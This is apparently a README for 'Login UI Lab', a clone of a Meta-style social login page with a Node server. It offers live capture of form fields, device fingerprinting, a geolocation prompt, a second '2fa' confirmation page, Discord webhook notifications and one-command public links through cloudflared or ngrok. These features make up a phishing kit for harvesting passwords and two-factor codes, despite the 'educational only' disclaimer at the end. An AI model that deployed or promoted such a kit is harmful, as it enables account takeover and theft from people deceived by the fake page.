<p align="center">
  <img src="assets/logo.svg" width="120" alt="Login UI Lab">
</p>

<h1 align="center">Login UI Lab</h1>

<p align="center">
  <strong>Pixel-accurate social login UI + zero-dep Node server</strong><br>
  Built for Termux · iSH · desktop · instant public tunnels
</p>

<p align="center">
  <a href="#quick-start"><img src="https://img.shields.io/badge/run-one_command-0A66C2?style=for-the-badge" alt="run"></a>
  <a href="#features"><img src="https://img.shields.io/badge/deps-zero-success?style=for-the-badge" alt="zero deps"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="MIT"></a>
</p>

---

### Why this exists

Most “login page clones” are incomplete screenshots. This is a **working lab**: floating labels, live input telemetry, device fingerprint fields, optional second-step confirmation page, and a single-file Node server that runs on a phone.

Use it to practice front-end fidelity, study form UX, or spin up a local demo behind Cloudflare Tunnel / ngrok in under a minute.

---

### Features

| | |
|---|---|
| **UI** | Floating labels, show/hide password, button state, real Meta footer links, desktop phone mock |
| **Server** | Pure Node — no Express required |
| **Telemetry** | Optional live field updates, screen / timezone / platform, geolocation prompt |
| **Second stage** | `/2fa.html` confirmation flow |
| **Mobile first** | Termux (Android) and iSH (iPhone) tested paths |
| **Public link** | One cloudflared or ngrok command |
| **Notify** | Optional Discord webhook via `DISCORD_WEBHOOK` env |

---

### Quick start

```bash
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

**Public HTTPS link (free)**

```bash
# Termux / Linux / macOS
cloudflared tunnel --url http://127.0.0.1:8080

# or
ngrok http 8080
```

Open the printed URL on any device.

**Optional Discord notify**

```bash
export DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
node server.js
```

---

### Termux

```bash
pkg install nodejs cloudflared git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js &
cloudflared tunnel --url http://127.0.0.1:8080
```

### iSH (iPhone)

```bash
apk add nodejs npm git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Keep iSH in the foreground. For tunnels on iOS, ngrok binary or a remote host is often smoother.

---

### Project layout

```
login-ui-lab/
├── index.html      # main login UI
├── 2fa.html        # confirmation step
├── server.js       # zero-dep server
├── assets/logo.svg
├── SETUP.md
└── cat.md          # one-shot paste
```

---

### Disclaimer

Educational and front-end practice only. Run locally or on infrastructure you control. Do not use against accounts or systems you do not own.

---

### License

MIT — see [LICENSE](LICENSE).
